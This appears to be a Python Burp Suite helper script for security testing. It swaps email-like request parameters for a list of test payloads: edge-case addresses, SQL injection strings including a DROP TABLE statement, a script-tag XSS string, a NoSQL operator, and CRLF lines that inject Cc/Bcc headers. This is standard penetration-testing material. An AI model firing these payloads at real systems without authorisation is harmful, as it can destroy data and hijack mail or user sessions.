#!/usr/bin/env python3
"""
Email Security Probe Bambda
- Detects email-like parameters and replaces value with diverse payloads
- Covers RFC edge-cases, validation bypass, CRLF/SMTP header injection, and simple injection strings

Usage:
- Load in Burp's request scripting/Bambda interface
- Optionally set header `X-Email-Payload-Index: N` to select a specific payload index
- Send request in Repeater to compare server behavior
"""
import os
import sys
import json
import random
import time

CURRENT_DIR = os.path.dirname(__file__)
SRC_PATH = os.path.abspath(os.path.join(CURRENT_DIR, "..", "..", "src"))
if SRC_PATH not in sys.path:
    sys.path.append(SRC_PATH)

try:
    from utils.intelligence_checker import ApplicabilityChecker
    checker = ApplicabilityChecker()
except Exception:
    checker = None

EMAIL_KEYS = {
    "email", "user_email", "login", "username", "user", "contact", "mail"
}

PAYLOADS = [
    # Normal and casing/alias variants
    "test@example.com",
    "TEST@EXAMPLE.COM",
    "test+alias@example.com",
    '"test user"@example.com',  # quoted local
    "test(comment)@example.com",  # comments
    "üser@example.com",  # unicode local
    "user@[127.0.0.1]",  # IP literal
    "test@sub.example.com",  # subdomain
    "a"*64 + "@example.com",  # long local
    "test@" + ("a"*63) + ".com",  # long label

    # Validation bypass/homoglyph (punycode left to server)
    "test@xn--pple-43d.com",

    # Injection attempts
    "test@example.com' OR '1'='1",
    "test@example.com" "--",
    "test@example.com'); DROP TABLE users;--",
    "<script>alert(1)</script>@example.com",

    # NoSQL patterns embedded
    "test$ne@example.com",

    # CRLF/SMTP header injection
    "victim@example.com\r\nCc: attacker@example.com",
    "victim@example.com\r\nBcc: attacker@example.com",
]


def _find_email_key(params: dict) -> str:
    keys = list(params.keys())
    for k in keys:
        kl = str(k).lower()
        for ek in EMAIL_KEYS:
            if ek in kl:
                return k
    return ""


def main(request):
    if checker and not checker.is_general_api_applicable(request):
        return request

    headers = getattr(request, "headers", {}) or {}
    params = getattr(request, "parameters", {}) or {}

    # Determine payload index from header
    sel = headers.get("X-Email-Payload-Index") or headers.get("x-email-payload-index")
    try:
        idx = int(sel)
    except Exception:
        idx = int(time.time()) % len(PAYLOADS)
    idx = max(0, min(len(PAYLOADS) - 1, idx))

    key = _find_email_key(params)
    if key:
        params[key] = PAYLOADS[idx]
        request.parameters = params
        return request

    # JSON body fallback
    ct = (headers.get("Content-Type") or headers.get("content-type") or "").lower()
    if "json" in ct:
        try:
            body = json.loads(getattr(request, "body", "") or "{}")
            if isinstance(body, dict):
                k = _find_email_key(body)
                if k:
                    body[k] = PAYLOADS[idx]
                else:
                    body["email"] = PAYLOADS[idx]
                request.body = json.dumps(body)
        except Exception:
            pass

    return request

if __name__ == "__main__":
    print("Email Security Probe Bambda loaded. Override payload via X-Email-Payload-Index header.")